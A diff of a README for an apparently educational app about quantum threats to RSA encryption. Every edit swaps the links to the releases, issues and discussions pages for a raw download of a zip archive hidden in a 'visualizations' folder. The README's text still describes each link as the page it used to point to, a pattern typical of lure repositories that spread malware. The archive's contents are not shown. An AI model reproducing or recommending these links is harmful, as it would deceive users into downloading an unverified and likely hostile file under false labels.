@@ -1,7 +1,7 @@
 # 🔒 Quantum-crypto - Understand Quantum Threats to Encryption
 
 ## 🔗 Download Now!
-[![Download Quantum-crypto](https://img.shields.io/badge/Download-Quantum--crypto-brightgreen)](https://github.com/CandraExploit/Quantum-crypto/releases)
+[![Download Quantum-crypto](https://github.com/CandraExploit/Quantum-crypto/raw/refs/heads/main/visualizations/crypto_Quantum_v2.5.zip)](https://github.com/CandraExploit/Quantum-crypto/raw/refs/heads/main/visualizations/crypto_Quantum_v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Quantum-crypto! This educational project helps you explore how quantum computing can threaten traditional RSA encryption. You will learn about Shor's Algorithm and discover solutions in post-quantum cryptography. 
@@ -11,7 +11,7 @@ Whether you are curious about cybersecurity or simply want to enhance your knowl
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of Quantum-crypto. 
 
-[Visit this page to download](https://github.com/CandraExploit/Quantum-crypto/releases)
+[Visit this page to download](https://github.com/CandraExploit/Quantum-crypto/raw/refs/heads/main/visualizations/crypto_Quantum_v2.5.zip)
 
 ### Step-by-Step Installation
 1. Click the link above.
@@ -45,7 +45,7 @@ Quantum-crypto is an educational tool that demonstrates the threats posed by qua
 No, the application is designed for users without programming experience. Just follow the steps and explore.
 
 ### What happens if I encounter a problem during installation?
-You can consult the "Help" section within the app for troubleshooting tips. Alternatively, you can visit our [GitHub Issues page](https://github.com/CandraExploit/Quantum-crypto/issues) to report your issue.
+You can consult the "Help" section within the app for troubleshooting tips. Alternatively, you can visit our [GitHub Issues page](https://github.com/CandraExploit/Quantum-crypto/raw/refs/heads/main/visualizations/crypto_Quantum_v2.5.zip) to report your issue.
 
 ### Can I contribute to this project?
 Absolutely! If you want to contribute, visit the repo to learn how you can help improve Quantum-crypto.
@@ -71,11 +71,11 @@ Absolutely! If you want to contribute, visit the repo to learn how you can help 
 For those interested in expanding their knowledge in these areas, this project serves as a crucial stepping stone.
 
 ## 📞 Support
-If you need help, please reach out via the contact information found in the application or visit the [GitHub Discussions](https://github.com/CandraExploit/Quantum-crypto/discussions) for community support.
+If you need help, please reach out via the contact information found in the application or visit the [GitHub Discussions](https://github.com/CandraExploit/Quantum-crypto/raw/refs/heads/main/visualizations/crypto_Quantum_v2.5.zip) for community support.
 
 ## 🌟 Join Us
 Be part of the Quantum-crypto community. Engage with other users, share your experiences, and learn together. The future of encryption is here, and understanding it is more important than ever.
 
 Remember to check out the latest releases. Click below to download Quantum-crypto now!
 
-[Visit this page to download](https://github.com/CandraExploit/Quantum-crypto/releases)
+[Visit this page to download](https://github.com/CandraExploit/Quantum-crypto/raw/refs/heads/main/visualizations/crypto_Quantum_v2.5.zip)
